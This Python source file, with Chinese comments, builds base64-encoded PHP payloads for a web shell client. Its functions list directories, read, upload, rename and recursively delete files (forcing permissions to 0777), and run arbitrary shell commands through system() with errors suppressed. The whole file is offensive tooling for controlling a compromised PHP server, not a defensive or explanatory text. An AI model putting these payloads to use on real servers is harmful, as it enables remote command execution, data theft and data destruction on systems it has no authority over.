import base64


def getFilePathBase():
    """
    获取请求url文件的文件路径
    :return: php->base64 code
    """
    code = """
    @ini_set("display_errors","0");
	@set_time_limit(0);
	@set_magic_quotes_runtime(0);
    header("Content-Type:application/json");
    $res = array();$res["path"] = dirname(__FILE__);
    echo ("<ek>");
    echo json_encode($res);
    echo ("</ek>");
    die();
    """
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")



def getFilelistBase(path):
    """
    获取该路径下所有文件信息
    :param path: 文件路径
    :return: PHP->base64 code
    """
    code = """
    header("Content-Type:application/json");
    @ini_set("display_errors","0");
	@set_time_limit(0);
	@set_magic_quotes_runtime(0);
    function getfile($path){
        $i=0;
        $res = array();
        if($handler = opendir($path)){
            while (($file = readdir($handler)) !==false){
                $f = array();
                $f["name"] = $file;
                $f['type'] = filetype($path ."/". $file);
                $f['time'] = date("Y-m-d H:i:s", filemtime($path ."/". $file));
                $f['size'] = filesize($path ."/". $file);
                $res[$i] = $f;
                $i++;
            }
            closedir($handler);
        }
        echo ("<ek>");
        echo json_encode($res);
        echo ("</ek>");
    }
    getfile("%s");die();
    """% path
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def getFile(path):
    """
    指定一个文件的路径，放回该文件的信息。
    :param path: 文件路径
    :return: PHP-> base64  code
    """
    code = """
    @ini_set("display_errors","0");
	@set_time_limit(0);
	@set_magic_quotes_runtime(0);
    $path = '%s';
    $hanlder = fopen($path, 'rb');
    $res = fread($hanlder, filesize($path));
    fclose($hanlder);
    echo $res;
    """% path
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def deleteFile(path):
    """
    删除文件
    :param path:
    :return:
    """
    code = """
    @ini_set("display_errors","0");
    @set_time_limit(0);
    @set_magic_quotes_runtime(0);
    function df($p){
	    $m=@dir($p);
	    while(@$f=$m->read()){
		    $pf=$p."/".$f;
		    if((is_dir($pf))&&($f!=".")&&($f!="..")){
			    @chmod($pf,0777);
			    df($pf);
		    }
		    if(is_file($pf)){
			    @chmod($pf,0777);
			    @unlink($pf);
		    }
	    }
	    $m->close();
	    @chmod($p,0777);
	    return @rmdir($p);
    }
    function delf($path){
	    echo("<ek>");
	    if(is_dir($path)){
		    echo(df($path));
	    }
	    else{
		    echo(file_exists($path)?@unlink($path)?"1":"0":"0");
	    };
	    echo("</ek>");
	    die();	
    }
    delf("%s");""" % path
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def changeName(path, newnamepath):
    code="""
    @ini_set("display_errors","0");
    @set_time_limit(0);
    echo("<ek>");;
    echo(rename("%s","%s")?"1":"0");;
    echo("</ek>");
    die();""" % (path, newnamepath)
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def uploadFile(path, content):
    code="""
    @ini_set("display_errors","0");
    @set_time_limit(0);
    echo("<ek>");
    function f($f,$c){
        $c=str_replace("\r","",$c);
        $c=str_replace("\n","",$c);
        $buf="";
        for($i=0;$i<strlen($c);$i+=2){
	        $buf.=urldecode("%".substr($c,$i,2));
        }
        echo(fwrite(fopen($f,"w"),$buf)?"1":"0");;
        echo("</ek>");
        die();
    }
    """+"""f('%s','%s');""" % (path, content)
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def createFile(path, content):
    code="""
    @ini_set("display_errors","0");
    @set_time_limit(0);
    function f($path, $content){
	    echo("<ek>");;
	    echo @fwrite(@fopen($path,"w"),$content)?"1":"0";;
	    echo("</ek>");
	    die();
    }
    f('%s', '%s');""" % (path, content)
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def createDir(path):
    code="""
    @ini_set("display_errors","0");
    @set_time_limit(0);
    function c($path){
	    echo("<ek>");;
	    echo(mkdir($path)?"1":"0");;
	    echo("</ek>");
	    die();
    }
    c('%s');
    """%path
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def execShellCreate():
    code="""
    @ini_set("display_errors","0");
    @set_time_limit(0);
    echo("<ek>");;
    $D=dirname($_SERVER["SCRIPT_FILENAME"]);
    if($D=="")
	    $D=dirname($_SERVER["PATH_TRANSLATED"]);
    $R="{$D}\t";
    if(substr($D,0,1)!="/"){
	    foreach(range("A","Z") as $L)
	    	if(is_dir("{$L}:"))$R.="{$L}:";
    }
    $R.="\t";
    $u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';
    $usr=($u)?$u['name']:@get_current_user();
    $R.=php_uname();
    $R.="({$usr})";
    print $R;;
    echo("</ek>");
    die();"""
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")


def execShell(cmd, options):
    code = """
    @ini_set("display_errors","0");
    @set_time_limit(0);
    echo("->|");;
    $p=base64_decode('%s');
    $s=base64_decode('%s');
    $d=dirname($_SERVER["SCRIPT_FILENAME"]);
    $c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";
    @system($r." 2>&1",$ret);
    print ($ret!=0)?"ret={$ret}":"";;
    echo("|<-");die();
    """% (cmd, options)
    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")



if __name__ == '__main__':
    # print(deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
    print(uploadFile('/vae/asd/asd', 'asdasd'))
